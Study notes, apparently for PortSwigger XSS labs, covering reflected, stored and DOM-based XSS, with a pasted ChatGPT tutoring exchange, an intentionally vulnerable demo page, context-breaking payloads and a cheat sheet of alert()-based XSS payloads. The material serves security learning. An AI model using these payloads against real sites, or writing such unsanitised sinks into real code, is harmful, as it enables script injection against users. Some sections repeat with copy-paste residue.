
[[jQuery Anchor Xss Lab - 1]]

> [!important]
> 
> ## ✅ Key Takeaway (What You Need to Know)
> 
> 1. The danger comes from trusting user input in the URL without cleaning.
> 2. The exact payload depends on **where the data is inserted in the DOM**:
>     - Inside `href` → Use `javascript:alert(1)`
>     - Inside HTML body → `<script>alert(1)</script>` or `<img src=1 onerror=alert(1)>`
>     - Inside an attribute → `" onmouseover="alert(1)` (to break out of the attribute)
> 3. Always inspect where your data ends up in the HTML to decide the payload.

---

## 🧠 Key Idea

**Reflected XSS** = User input is immediately **reflected** back in the HTTP response without being properly sanitized → attacker can inject JavaScript into the victim’s browser.

The paragraph you gave explains:

1. **Where the reflected data appears** (context) matters because it determines the payload format.
2. **Any input filtering** changes what payload will work.
3. **How to manually test** for reflected XSS.

---

## 🛠 Step-by-Step: Manual Reflected XSS Testing

### 1️⃣ Test **every entry point**

You need to test:

- URL **query parameters** → `https://site.com/search?term=value`
- **POST body parameters** (forms)
- **URL path segments** → `https://site.com/user/value`
- **HTTP headers** (`User-Agent`, `Referer`, `X-Forwarded-For`) — though many header-based XSS are impractical to exploit.

---

### 2️⃣ Submit a **random alphanumeric value**

- Example: `abcd1234`
- Why? It’s short, survives basic filters, and easy to search for in the HTML response.
- **Tool tip**: In **Burp Intruder**, use random hex payloads and set up **Grep Match** to highlight reflections.

---

### 3️⃣ Identify **context of reflection**

Where is the value placed in the HTML response? Examples:

- Between HTML tags → `<p>abcd1234</p>` → simple `<script>` injection possible.
- Inside a tag attribute → `<input value="abcd1234">` → may require escaping quotes.
- Inside JavaScript → `var x = "abcd1234";` → may require breaking out of a string.

---

### 4️⃣ Test a **candidate payload**

- If between HTML tags: `<script>alert(1)</script>`
- If inside attribute: `" onmouseover="alert(1)`
- If inside JS: `";alert(1);//`

**Pro tip**: Use Burp Repeater to modify the request directly and check responses quickly.

---

### 5️⃣ Try **alternative payloads** if filtered

If your payload is blocked:

- Try HTML entity encoding: `&lt;script&gt;alert(1)&lt;/script&gt;`
- Try breaking out of the tag or attribute differently.
- Try event handlers like `onerror` in images:
    
    ```HTML
    <img src=x onerror=alert(1)>
    ```
    

---

### 6️⃣ Test in a **real browser**

Once you think it’s exploitable:

- Paste the crafted URL into your browser.
- If `alert(document.domain)` pops, you’ve got XSS.

---

## 📌 Quick Differences Recap

|Type|Storage|Needs Delivery?|Severity|
|---|---|---|---|
|**Reflected XSS**|No|Yes (via link/email/etc.)|Medium|
|**Stored XSS**|Yes|No (runs automatically)|High|
|**Self-XSS**|No|Victim must paste payload|Low|

---

## 💡 From a Hacker’s Perspective

When you’re doing bug bounties:

- Don’t test **only** one parameter → **test them all**.
- Understand **XSS contexts** so you can pick the right payload fast.
- Build **Burp macros** and **custom Python scripts** to automate reflection checks.

---

### 1️⃣ **"Varieties of stored XSS"**

Stored XSS is not just one type of bug —

The **position** where the stored malicious code appears in the HTML response **changes** how you have to write your payload.

Example:

If your malicious input ends up here:

```HTML
<p>...YOUR INPUT...</p>
```

You might inject:

```HTML
<script>alert('XSS')</script>
```

But if your malicious input is stored **inside a JavaScript variable**:

```HTML
<script>
let username = "YOUR INPUT";
</script>
```

You can’t just throw `<script>` inside — you need something like:

```JavaScript
";alert('XSS');//
```

to break out of the string.

💡 **Takeaway**:

Where your data lands in the HTML/JS **changes the shape** of your attack.

---

### 2️⃣ **"Location of the stored data in the response"**

This simply means:

- Is your stored input placed **inside normal HTML text**?
- Inside a **tag attribute** like `src` or `href`?
- Inside **inline JavaScript**?
- Inside a **CSS block**?
- Inside an **event handler** like `onclick`?

**Example:**

Inside HTML:

```HTML
<p>Hello, <b>Hacker</b></p>
```

Inside attribute:

```HTML
<img src="Hacker">
```

Inside JS:

```JavaScript
let name = "Hacker";
```

Each requires a **different XSS payload style**.

---

### 3️⃣ **"Validation or processing before storage"**

Some websites **filter** or **sanitize** what you type before saving.

This affects which payloads work.

Examples of filtering:

- **Encoding characters**: `<` becomes `&lt;`
- **Removing script tags**: `<script>` gets deleted
- **Allowing only letters/numbers**

If they filter `<script>`, you might try:

```HTML
<img src=x onerror=alert(1)>
```

If they filter `onerror`, you might try breaking out of HTML into JS.

💡 **Takeaway**:

You sometimes need **bypass tricks** depending on how the website cleans your input.

---

### 4️⃣ **Impact changes based on location**

If your code runs **every time a page loads** (e.g., blog homepage), that’s massive impact.

If it only runs when an admin views a hidden page — still powerful, but different scope.

---

### ⚡ In code example

Here’s one HTML snippet with **different locations** where stored XSS could happen:

```HTML
<!-- Stored inside HTML -->
<p>Comment: HACKER_INPUT</p>

<!-- Stored inside attribute -->
<a href="HACKER_INPUT">Click here</a>

<!-- Stored inside JavaScript -->
<script>
let data = "HACKER_INPUT";
</script>
```

You would need:

```HTML
<script>alert(1)</script>    <!-- HTML context -->
" onmouseover="alert(1)      <!-- Attribute context -->
";alert(1);//                 <!-- JS context -->
```

---

### 1️⃣ **"Varieties of stored XSS"**

Stored XSS is not just one type of bug —

The **position** where the stored malicious code appears in the HTML response **changes** how you have to write your payload.

Example:

If your malicious input ends up here:

```HTML
html
CopyEdit
<p>...YOUR INPUT...</p>

```

You might inject:

```HTML
html
CopyEdit
<script>alert('XSS')</script>

```

But if your malicious input is stored **inside a JavaScript variable**:

```HTML
html
CopyEdit
<script>
let username = "YOUR INPUT";
</script>

```

You can’t just throw `<script>` inside — you need something like:

```JavaScript
javascript
CopyEdit
";alert('XSS');//

```

to break out of the string.

💡 **Takeaway**:

Where your data lands in the HTML/JS **changes the shape** of your attack.

---

### 2️⃣ **"Location of the stored data in the response"**

This simply means:

- Is your stored input placed **inside normal HTML text**?
- Inside a **tag attribute** like `src` or `href`?
- Inside **inline JavaScript**?
- Inside a **CSS block**?
- Inside an **event handler** like `onclick`?

**Example:**

Inside HTML:

```HTML
html
CopyEdit
<p>Hello, <b>Hacker</b></p>

```

Inside attribute:

```HTML
html
CopyEdit
<img src="Hacker">

```

Inside JS:

```JavaScript
javascript
CopyEdit
let name = "Hacker";

```

Each requires a **different XSS payload style**.

---

### 3️⃣ **"Validation or processing before storage"**

Some websites **filter** or **sanitize** what you type before saving.

This affects which payloads work.

Examples of filtering:

- **Encoding characters**: `<` becomes `&lt;`
- **Removing script tags**: `<script>` gets deleted
- **Allowing only letters/numbers**

If they filter `<script>`, you might try:

```HTML
html
CopyEdit
<img src=x onerror=alert(1)>

```

If they filter `onerror`, you might try breaking out of HTML into JS.

💡 **Takeaway**:

You sometimes need **bypass tricks** depending on how the website cleans your input.

---

### 4️⃣ **Impact changes based on location**

If your code runs **every time a page loads** (e.g., blog homepage), that’s massive impact.

If it only runs when an admin views a hidden page — still powerful, but different scope.

---

### ⚡ In code example

Here’s one HTML snippet with **different locations** where stored XSS could happen:

```HTML
html
CopyEdit
<!-- Stored inside HTML -->
<p>Comment: HACKER_INPUT</p>

<!-- Stored inside attribute -->
<a href="HACKER_INPUT">Click here</a>

<!-- Stored inside JavaScript -->
<script>
let data = "HACKER_INPUT";
</script>

```

You would need:

```HTML
html
CopyEdit
<script>alert(1)</script>    <!-- HTML context -->
" onmouseover="alert(1)      <!-- Attribute context -->
";alert(1);//                 <!-- JS context -->
```

Alright, let’s break that whole chunk down into **plain English**, but also keep the **technical depth** so you can apply it in real hacking and bug bounty practice.

I’ll also relate each term to **real examples in HTML, JavaScript, and HTTP** so you don’t just “read” it — you’ll actually **see** how it works.

---

## **1️⃣ Stored XSS Testing in Simple Words**

Stored XSS means:

- You **send data** to a website (e.g., a comment, profile name, message).
- The website **saves it in the database**.
- Later, when **anyone** loads a page that shows your saved data, your JavaScript runs in their browser.

So the game is:

- **Find where you can put data in** (entry points).
- **Find where it comes back out** (exit points).
- See if you can make it run JavaScript instead of just showing text.

---

## **2️⃣ Entry Points** → “Where can I inject data?”

These are places where you send data into the site. Examples:

- **Form fields**: comment box, profile update, feedback form.
- **URL parameters**:
    
    ```Plain
    https://site.com/profile?name=Hacker
    ```
    
- **Path in the URL**:
    
    ```Plain
    https://site.com/Hacker
    ```
    
- **HTTP headers** (special case): `User-Agent`, `Referer`, `X-Forwarded-For` (sometimes stored in logs or analytics pages).
- **Other systems**:
    - Email inbox in a webmail app (you send HTML/JS in the email).
    - Twitter feed widget (inject in a tweet).
    - News feed aggregator (inject on your own blog, it shows on their site).

💡 Think: **Anywhere your input might be saved for later display.**

---

## **3️⃣ Exit Points** → “Where does my data show up later?”

These are the **responses** (HTML pages) where your data is shown to someone. Examples:

- Your comment showing up on a blog post.
- Your profile name shown on an admin dashboard.
- Your search history shown in “recent searches.”
- Error logs or reports that display your input.

💡 Trick: Sometimes **you can’t see the exit point yourself**, but an admin can — that’s still exploitable.

---

## **4️⃣ Why this is hard**

- Your input can **show up anywhere** in the app — not just where you put it in.
- Stored data can **be overwritten** quickly (e.g., “recent searches” list).
- You might have to test dozens of input fields and look for where the data reappears.

---

## **5️⃣ How to Test Stored XSS (Manually)**

1. **Choose a unique marker** (so you can search for it later):
    
    ```Plain
    abc123xyz
    ```
    
    - This is short, random, and survives most filters.
    - Avoid common words so you don’t confuse with normal text.
2. **Inject into one input field at a time**.
    - Example: Enter it into a comment box, submit.
3. **Browse the app and search** for `abc123xyz` showing up anywhere.
    - Use Burp Suite’s search or proxy history to find it.
    - If you find it **in a later response**, it might be stored.
4. **Check context** — where is it in HTML?
    - In normal text?
    - In HTML attributes?
    - In JavaScript code?
    - This decides what payload to try.
5. **Try an XSS payload** for that context:
    - HTML text:
        
        ```HTML
        <script>alert(1)</script>
        ```
        
    - Attribute:
        
        ```HTML
        " onmouseover="alert(1)
        ```
        
    - Inside JavaScript:
        
        ```JavaScript
        ";alert(1);//
        ```
        
6. **View in browser** — confirm if your payload runs.

---

## **6️⃣ In Code Example**

Imagine a blog comment feature:

**Entry point:**

```Plain
POST /comment HTTP/1.1
Host: blog.com
Content-Length: 35

name=Hacker&comment=abc123xyz
```

**Exit point in HTML:**

```HTML
<div class="comment">abc123xyz</div>
```

If not sanitized, your comment could be:

```HTML
<div class="comment"><script>alert(1)</script></div>
```

Now anyone viewing the post **runs your JavaScript**.

---

## **7️⃣ Tools for Faster Discovery**

- **Burp Suite Pro**: has an automated scanner that detects XSS.
- **Burp Repeater**: for testing different payloads.
- **Burp Intruder**: for injecting many payloads at once.

---

## **1. What is DOM-based XSS?**

- DOM = **Document Object Model** (basically the structure of a web page in the browser).
- In **DOM XSS**, the vulnerable code is **JavaScript running in the browser**, not the server.
- So the attack happens **fully in the client-side JS** → the server may not even see the malicious payload.

👉 **Plain English Example**:

A web developer writes JavaScript like this:

```HTML
<html>
  <body>
    <p id="msg"></p>
    <script>
      // Take data from URL: ?name=Hacker
      var name = new URLSearchParams(window.location.search).get("name");
      // Write it into the page
      document.getElementById("msg").innerHTML = "Hello " + name;
    </script>
  </body>
</html>
```

If the URL is:

```Plain
https://vulnerable.com/?name=Shashank
```

The page shows:

```Plain
Hello Shashank
```

✅ All good.

But an attacker could send:

```Plain
https://vulnerable.com/?name=<script>alert('XSS')</script>
```

Then the page shows:

```Plain
Hello <script>alert('XSS')</script>
```

And the script **executes** in the victim’s browser.

💡 **This happens because the JavaScript reads from a source (the URL) and writes to a sink (**`**innerHTML**`**) without sanitization.**

---

## **2. Sources and Sinks**

- **Source**: Where attacker input comes from.
    
    Examples:
    
    - `window.location`
    - `document.URL`
    - `document.referrer`
    - `location.hash` (`#fragment`)
    - `localStorage`, `postMessage`
- **Sink**: Where input gets used dangerously.
    
    Examples:
    
    - `innerHTML`
    - `document.write()`
    - `eval()`
    - `setTimeout("...")` with a string
    - `Function("...")`

👉 DOM XSS = data flows from **source → sink** without validation.

---

## **3. How DOM-based XSS is Different**

- **Reflected XSS**: Server reflects input immediately in response.
- **Stored XSS**: Server stores input in DB and later shows it.
- **DOM-based XSS**: Input never goes to server; browser JS itself processes it.

So with DOM XSS, even if the **server-side code is perfect**, the **client-side JS can still be vulnerable.**

---

## **4. Testing DOM-based XSS (Manual Method)**

Here’s how you’d hunt it step by step:

1. **Check Sources**:
    - Play with `?param=`, `#fragment`, or modify headers like `Referer`.
    - Example:
        
        ```Plain
        https://site.com/page\#payload
        ```
        
2. **See if it’s used in HTML**:
    - Open **DevTools → Elements tab** (NOT “View Source”).
    - Search for your test string like `abc123`.
3. **Try Payloads Based on Context**:
    - In HTML:
        
        ```HTML
        <img src=x onerror=alert(1)>
        ```
        
    - In JS string:
        
        ```Plain
        ";alert(1);//
        ```
        
    - In attribute:
        
        ```Plain
        " onmouseover=alert(1) "
        ```
        
4. **Check Sinks**:
    - Look at JavaScript code in DevTools.
    - Use **Ctrl+Shift+F** to search for `location`, `document.URL`, etc.
    - See if they’re assigned into `innerHTML`, `eval`, etc.

---

## **5. Example DOM XSS Attack**

Imagine the developer wrote:

```HTML
<script>
  var fragment = location.hash.substring(1); // Get # from URL
  document.write(fragment);
</script>
```

If you visit:

```Plain
https://site.com/#<img src=x onerror=alert(1)>
```

It will execute `alert(1)` in the victim’s browser.

---

## **6. Tools for DOM XSS**

- **Burp Suite DOM Invader** (auto-detects sources/sinks).
- **Browser DevTools** (manual tracking of variables).
- **PayloadsAllTheThings** → XSS payloads for each context.

---

✅ **Summary in one line**:

DOM XSS = JavaScript in the browser takes attacker-controlled input from the URL (or another source) and inserts it directly into the page (sink) without sanitizing → lets attacker run arbitrary JS in the victim’s browser.

Here’s the small code again:

```HTML
<html>
  <body>
    <p id="msg"></p> <!-- empty paragraph -->
    <script>
      // Take data from URL: ?name=Hacker
      var name = new URLSearchParams(window.location.search).get("name");

      // Write it into the page
      document.getElementById("msg").innerHTML = "Hello " + name;
    </script>
  </body>
</html>

```

---

### 🔎 Step 1: What is happening here?

1. `?name=Hacker` → this is a **query string** in the URL.
    
    Example:
    
    ```Plain
    https://vulnerable.com/page.html?name=Shashank
    
    ```
    
2. `new URLSearchParams(window.location.search).get("name")`
    - `window.location.search` = `?name=Shashank` (the stuff after `?` in the URL).
    - `.get("name")` → extracts the value of `name`, which is `Shashank`.
    - So the variable `name` = `"Shashank"`.
3. `document.getElementById("msg").innerHTML = "Hello " + name;`
    - It finds the empty `<p id="msg"></p>`.
    - And inserts:
        
        ```Plain
        Hello Shashank
        
        ```
        

✅ So if you visit:

```Plain
https://vulnerable.com/page.html?name=Shashank

```

The page shows:

```Plain
Hello Shashank

```

---

### 🔎 Step 2: Where is the problem?

The developer is **directly putting user input (from URL) into HTML** using `innerHTML`.

So if an attacker gives this URL:

```Plain
https://vulnerable.com/page.html?name=<script>alert('Hacked')</script>

```

Then the browser will render:

```HTML
<p id="msg">Hello <script>alert('Hacked')</script></p>

```

⚡ The `<script>` runs → a popup appears.

That’s **DOM-based XSS** because:

- The input (`name`) comes from **client-side (browser URL)**.
- The sink (`innerHTML`) executes it.

---

### 🔎 Step 3: Easy analogy

Imagine:

- A website says: "Tell me your name and I’ll greet you."
- You say: `Shashank` → site says `Hello Shashank`.
- But instead, you say: `<script>stealCookies()</script>`.
- The site says: `Hello <script>stealCookies()</script>` and runs it.

That’s DOM XSS.

---

💡 Does this make more sense now if I show you the actual **step-by-step URL change and output**?

I can even create a **tiny HTML file** you can run on your laptop and see the popup happen. Want me to make that for you?

### You said:

so how to perform this

### ChatGPT said:

Perfect 🤝 let’s actually **do it step by step on your own laptop** so you see DOM XSS in action.

---

## 🛠 Steps to Perform DOM XSS

### 1. Create a vulnerable HTML file

Open Notepad (or VS Code) and paste this code:

```HTML
<!DOCTYPE html>
<html>
  <head>
    <title>DOM XSS Demo</title>
  </head>
  <body>
    <h2>Welcome!</h2>
    <p id="msg"></p> <!-- This is where user input will go -->

    <script>
      // Grab the "name" parameter from the URL
      var name = new URLSearchParams(window.location.search).get("name");

      // Insert it directly into the page
      document.getElementById("msg").innerHTML = "Hello " + name;
    </script>
  </body>
</html>

```

Save this file as:

```Plain
domxss.html

```

---

### 2. Open it in your browser

- Double-click `domxss.html` → it opens in Chrome/Firefox.
- By default, you’ll see just:
    
    ```Plain
    Welcome!
    Hello null
    
    ```
    
    (because there’s no `?name=` in the URL yet).
    

---

### 3. Try normal input

Now in the address bar, add:

```Plain
file:///C:/Users/YourName/Desktop/domxss.html?name=Shashank

```

👉 Output:

```Plain
Welcome!
Hello Shashank

```

---

### 4. Perform the XSS attack 🚀

Now replace the `name` parameter with malicious JavaScript:

```Plain
file:///C:/Users/YourName/Desktop/domxss.html?name=<script>alert('Hacked')</script>

```

👉 The browser renders:

```HTML
Hello <script>alert('Hacked')</script>

```

And you’ll see a popup:

⚡ `Hacked`

---

## 🎯 What just happened?

- You controlled the page content via the **URL** (`source`).
- The page inserted it using `innerHTML` (`sink`).
- Your JavaScript ran inside the victim’s browser → **DOM-based XSS**.

---

🔥 That’s literally how attackers test DOM XSS on real websites, just using Burp or their browser.

---

Do you want me to now show you how to **fix this code** (so it’s safe from XSS), or should we continue focusing on the **attacking side only** for now?

### You said:

function trackSearch(query) {  
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');  
}  
var query = (new URLSearchParams(window.location.search)).get('search');  
if(query) {  
trackSearch(query);  
}  
explain this in simple way but maintain technality

### ChatGPT said:

Great one 🔥 — let’s break this down **line by line**, but I’ll keep the explanation technical while also making it simple:

---

### Code:

```JavaScript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}

```

---

### 🔎 Step-by-step Explanation

1. **Function definition**
    
    ```JavaScript
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    
    ```
    
    - This defines a function called `trackSearch`.
    - It takes one argument → `query` (the search term).
    - Inside, it uses `document.write()` to dynamically write some HTML into the page.
    - Specifically, it creates an **image tag (**`**<img>**`**)** where the `src` attribute is set to:
        
        ```Plain
        /resources/images/tracker.gif?searchTerms=<user_input>
        
        ```
        
    - Example: If the query = `apple`, it writes:
        
        ```HTML
        <img src="/resources/images/tracker.gif?searchTerms=apple">
        
        ```
        
    - This is a **tracking pixel** (a 1x1 image usually) that records what the user searched for.

---

1. **Extracting the search parameter**
    
    ```JavaScript
    var query = (new URLSearchParams(window.location.search)).get('search');
    
    ```
    
    - `window.location.search` = the query string in the URL (the part after `?`).
        - Example:
            
            ```Plain
            https://example.com/page.html?search=banana
            
            ```
            
            → `window.location.search` = `?search=banana`
            
    - `new URLSearchParams(...).get('search')` extracts the value of the `search` parameter.
        - In this case, `banana`.
    
    👉 So `query = "banana"`
    

---

1. **Checking if query exists**
    
    ```JavaScript
    if(query) {
        trackSearch(query);
    }
    
    ```
    
    - If the `search` parameter exists (not null), then call the `trackSearch()` function with it.
    - Meaning → if the URL has `?search=banana`, the page will write:
        
        ```HTML
        <img src="/resources/images/tracker.gif?searchTerms=banana">
        
        ```
        

---

### ⚡ Technical Insight

This is a **classic DOM sink vulnerability** because:

- The user input (`query` from URL) is directly inserted into HTML via `document.write()`.
- If an attacker sets:
    
    ```Plain
    ?search=<script>alert(1)</script>
    
    ```
    
    the resulting code becomes:
    
    ```HTML
    <img src="/resources/images/tracker.gif?searchTerms=<script>alert(1)</script>">
    
    ```
    
    → which executes arbitrary **JavaScript**.
    

---

✅ **Summary in simple words**:

- The script takes whatever you put in the URL parameter `search`.
- It builds an `<img>` tag with that input as part of its `src`.
- If you pass normal text, it just tracks your search.
- If you pass malicious code, it can inject JavaScript (DOM XSS).

---

Would you like me to **show you a live exploit payload** for this specific function (like what exactly you’d inject to trigger XSS)?

### You said:

DOM XSS in document.write sink using source location.search inside a select element  
how can i solve this lab and what approach should i follow and how to know what to do?

### ChatGPT said:

Good question 👍 you’ve just hit the type of **PortSwigger lab challenge** they give you for DOM XSS. Let me break it down step by step so you not only solve _this lab_ but also know the **approach for any DOM XSS problem**.

---

## 🔎 The Lab:

**DOM XSS in** `**document.write**` **sink using source** `**location.search**` **inside a** `**<select>**` **element**

---

### 1. What this means

- **Source**: `location.search` → input is coming from the **URL query string**.
    
    Example:
    
    ```Plain
    https://vulnerable-site.com/page?color=red
    
    ```
    
    → `red` is attacker-controlled.
    
- **Sink**: `document.write()` → outputs data directly into the HTML DOM.
    
    That’s dangerous because attacker-controlled input is written straight into the page.
    
- **Context**: The vulnerable output happens **inside a** `**<select>**` **element**.
    
    Example:
    
    ```HTML
    <select>
      <option>red</option>
    </select>
    
    ```
    

---

### 2. Approach to Solve

Whenever you see a DOM XSS lab:

1. **Identify the source**
    - Look at how the page reads input. In this lab → `location.search` (query string).
2. **Find where it’s written (the sink)**
    - Here → `document.write()` inserts it into HTML (inside `<select>`).
3. **Understand the context**
    - Your payload is inside `<option> ... </option>`.
    - That means your input is _inside element text_. To escape, you need to **break out of the HTML context**.
4. **Inject a payload that escapes the context**
    - Normal input:
        
        ```Plain
        ?color=red
        
        ```
        
        →
        
        ```HTML
        <select>
          <option>red</option>
        </select>
        
        ```
        
    - Attacker input:
        
        ```Plain
        ?color=</option><script>alert(1)</script>
        
        ```
        
        →
        
        ```HTML
        <select>
          <option></option><script>alert(1)</script>
        </select>
        
        ```
        
        ✅ The injected `</option>` closes the element, then `<script>` executes.
        

---

### 3. Payload Example

```Plain
https://vulnerable-site.com/page?color=</option><script>alert(1)</script>

```

This works because:

- You “break out” of the `<option>` tag.
- Then you insert a new `<script>` tag.
- Browser parses it and executes your JS (`alert(1)`).

---

### 4. General Strategy for DOM XSS Labs

When stuck:

1. Look at the **context** (inside a tag? attribute? JS string?).
2. Try to **close the existing context** with `">` or `</tag>`.
3. Inject your payload (`<script>alert(1)</script>` or `onerror=alert(1)`).
4. Test step by step in Burp Repeater or directly in the browser.

---

⚡ **Key tip**: With DOM-based labs → _don’t overthink_. Always check:

- Where does my input land? (between tags, inside attributes, or inside JS).
- Then craft the minimal payload to escape that context.

---

👉 Do you want me to show you **all the common DOM XSS contexts (HTML text, attributes, JS strings, etc.) with escape payloads**, so you’ll know exactly what to try in _any_ lab?

### You said:

still didnt understood

### ChatGPT said:

Got you bro 👍 let’s slow it way down. You don’t need to feel dumb — DOM XSS looks confusing at first because there are too many “sources, sinks, contexts” words. I’ll explain in **ultra simple but still technical** way with this lab only.

---

## The Lab Statement Again

> DOM XSS in document.write sink using source location.search inside a <select> element

---

### Step 1: What’s happening in code

Imagine the website has this JavaScript:

```JavaScript
var color = (new URLSearchParams(window.location.search)).get('color');
document.write("<select><option>" + color + "</option></select>");

```

- `window.location.search` → is the part after `?` in the URL.
    
    Example:
    
    ```Plain
    https://site.com/page?color=red
    
    ```
    
    → `color = "red"`.
    
- `document.write()` → directly prints it into the HTML page.

So if you visit:

```Plain
https://site.com/page?color=red

```

The browser will render:

```HTML
<select>
  <option>red</option>
</select>

```

✅ Safe so far.

---

### Step 2: Where can an attacker break this?

The website puts **your input inside** `**<option>**` **tags**.

So attacker thinks:

👉 “If I can **close** the `<option>` tag early, I can inject my own code after it.”

---

### Step 3: Attacker payload

Change URL to:

```Plain
https://site.com/page?color=</option><script>alert(1)</script>

```

Now the browser renders:

```HTML
<select>
  <option></option><script>alert(1)</script>
</select>

```

- First `</option>` closes the tag.
- Then `<script>alert(1)</script>` runs.
- BOOM 💥 XSS executed.

---

### Step 4: Why this works

- Normal users only see safe text like `red`.
- But attacker **controls the HTML structure** because `document.write()` is unsafe.
- The browser happily executes `<script>` inside the page.

---

### Step 5: How to think about ANY DOM XSS lab

1. Look at **where your input is placed** (inside tag? attribute? JS code?).
2. Try to **escape that spot**:
    - Inside text → use `</tag><script>alert(1)</script>`
    - Inside attribute → use `"><script>alert(1)</script>`
    - Inside JS string → use `');alert(1);//`
3. Always test with something harmless like `alert(1)`.

---

⚡ So in this lab → the trick is simply:

```Plain
?color=</option><script>alert(1)</script>

```

---

Shashank, do you want me to **build a mini practice HTML file** for you with this exact vuln, so you can run it locally and _see the XSS happen_ in your browser?

### You said:

i am asking how can i find this vulnerability in real life

### ChatGPT said:

Perfect question bro 👊 — now you’re thinking like a real bug hunter.

Finding **DOM-based XSS in real life** is different from reading a lab because in the wild, you don’t know where the vulnerable code is hiding. Let me break it into **practical hacker steps**:

---

## 🔍 Step 1: Identify **sources** (where user input comes from)

DOM XSS happens when **JavaScript in the page** reads from something attacker controls.

Common sources:

- `location.search` → query string (`?id=123`)
- `location.hash` → fragment (`#section`)
- `location.pathname` → URL path (`/user/123`)
- `document.cookie` → cookies
- `document.referrer` → referrer header

👉 In real life: try adding random strings like `test123` to query params or fragments in the URL and see if they appear in the page DOM.

---

## 🔍 Step 2: Identify **sinks** (where input is written/executed)

If the app uses JavaScript functions like:

- `document.write()`
- `innerHTML`
- `outerHTML`
- `eval()`
- `setTimeout("code")`
- jQuery’s `.html()`

🚨 These are dangerous because they can execute injected HTML/JS.

👉 In real life: Use browser **DevTools** (Ctrl+Shift+F → search) and check if these sinks are used in page JavaScript.

---

## 🔍 Step 3: Fuzz and Observe

- Put payloads in query string:
    
    ```Plain
    ?q=Shashank123
    
    ```
    
- Then open **DevTools → Elements tab** and search `Shashank123`.
- If you find it inside HTML structure or inside JavaScript → this is a potential sink.

Example:

```HTML
<select><option>Shashank123</option></select>

```

→ Now you try breaking out:

```Plain
?q=</option><script>alert(1)</script>

```

---

## 🔍 Step 4: Tools that make life easier

- **Burp Suite DOM Invader** (built into Burp’s browser)
    
    → automatically traces flow from **sources → sinks**.
    
- **Manual Chrome DevTools**
    
    → search for your payload in DOM and JS.
    
- **Payload lists**
    
    → start with `"><script>alert(1)</script>` and adjust depending on context.
    

---

## 🧠 How pros approach real apps

1. Open target in Burp → browse normally.
2. Every time you see a parameter, fuzz with unique marker like `abc123`.
3. Use DevTools to search if `abc123` shows up in the page → if yes, check context.
4. If it’s in a **sink**, try breaking out and injecting JS.

---

⚡ **Mindset tip**:

Don’t think “I need to find XSS.” Instead think:

> “Where does my input go, and how does the browser interpret it?”

---

Here’s a **Structured XSS Testing Cheat Sheet & Practice Guide** to help you methodically approach every XSS vulnerability, so you don’t miss any attack vectors in the future:

---

## ✅ Step-by-Step XSS Testing Methodology

### 1️⃣ Identify All Entry Points

- Test these places where data is submitted to the web app:
    - URL query parameters → `https://site.com/search?term=value`
    - Form fields → comment box, feedback form
    - HTTP headers → `User-Agent`, `Referer`, `X-Forwarded-For`
    - Path segments → `https://site.com/profile/value`

---

### 2️⃣ Submit a Unique Marker

- Use a unique string like:
    
    ```Plain
    abc123xyz
    ```
    
- Submit it and look for it in the response (browser dev tools or Burp Proxy).

---

### 3️⃣ Find Reflection Points & Contexts

Where does your marker appear in the response?

- Between HTML tags →
    
    ```HTML
    <p>abc123xyz</p>
    ```
    
- Inside attributes →
    
    ```HTML
    <img src="abc123xyz">
    ```
    
- Inside JavaScript →
    
    ```HTML
    <script>
        var x = "abc123xyz";
    </script>
    ```
    

---

### 4️⃣ Test Candidate XSS Payloads Based on Context

|Context|Example Payload|
|---|---|
|HTML body text|`<script>alert(1)</script>`|
|Attribute|`" onmouseover="alert(1)`|
|JavaScript string|`";alert(1);//`|
|Event handler|`<img src=x onerror=alert(1)>`|

▶️ Start simple, escalate if needed.

---

### 5️⃣ Test in Browser

- Paste your crafted URL into the browser’s address bar or use Burp Proxy.
- Confirm that your payload runs:
    
    Example:
    
    ```JavaScript
    alert(document.domain)
    ```
    

---

## ✅ Cheat Sheet: Common XSS Payloads

### General Payloads

```HTML
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<body onload=alert(1)>
```

### For Attribute Contexts

```HTML
" onmouseover="alert(1)
' onmouseover='alert(1)
```

### For JavaScript Contexts

```JavaScript
"; alert(1); //
' ; alert(1); //
```

---

## ✅ Tools You Should Always Use

- 🔧 **Burp Suite (Community or Pro)**
    - Proxy → To inspect & modify requests.
    - Repeater → To manually inject payloads.
    - Intruder → Automate injections.
    - Scanner → Automatically detects vulnerabilities.
- 🧱 **Browser Developer Tools (F12)**
    - Console → See if JavaScript is executed.
    - Elements → Inspect where your input shows up.
- 💻 **Online Labs**
    - [PortSwigger Web Security Academy](https://portswigger.net/web-security)
    - [TryHackMe XSS Rooms](https://tryhackme.com/room/xss)
    - [Hack The Box Challenges](https://www.hackthebox.com/)

---

## ✅ Practice Routine Example (Daily)

|Day|Activity|
|---|---|
|1|Learn HTML & JS basics (focus on attributes like `onerror`)|
|2|Practice basic XSS payloads in Burp Repeater (test simple inputs)|
|3|Study stored vs reflected vs DOM XSS (write a simple vulnerable page)|
|4|Attempt 3 PortSwigger Labs (one reflected, one stored, one DOM)|
|5|Review concepts → Write a small cheat sheet for yourself|
|6|Test random websites in scope (try low-hanging fruits)|
|7|Build a simple vulnerable web app in your local environment and practice exploiting it|

---

## ✅ Mindset to Avoid Overwhelm

👉 Don’t try to master everything at once.

Focus on **building muscle memory** by practicing the same process repeatedly.

⏱ Consistency > Intensity

- Even 30–60 mins/day gives you enormous progress over time.

---

Here’s how to find your submitted input in the response using **Browser Developer Tools** and **Burp Proxy**:

---

### ✅ 1️⃣ Using Browser Developer Tools

### Step-by-Step:

1. 🚀 Submit your input in the web app (e.g., type `abc123xyz` in the search box and click Search).
2. 🔧 Press `F12` (or right-click → Inspect) to open DevTools.
3. 🔍 Go to the **Elements** tab.
4. Press `Ctrl + F` (or `Cmd + F` on Mac) to open the search bar.
5. 🔎 Search for your marker string:
    
    ```Plain
    abc123xyz
    ```
    
6. ✅ If found in the HTML DOM (inside `<div>`, `<p>`, or anywhere), you’ve located where the data appears.
7. 👁️‍🗨️ Observe the exact place where it appears:
    - Between normal tags → simple injection possible.
    - Inside attributes → need to escape quotes.
    - Inside JavaScript → craft special payload.

---

### ✅ 2️⃣ Using Burp Proxy

### Step-by-Step:

1. 🌐 Set up Burp Proxy to intercept your browser’s requests:
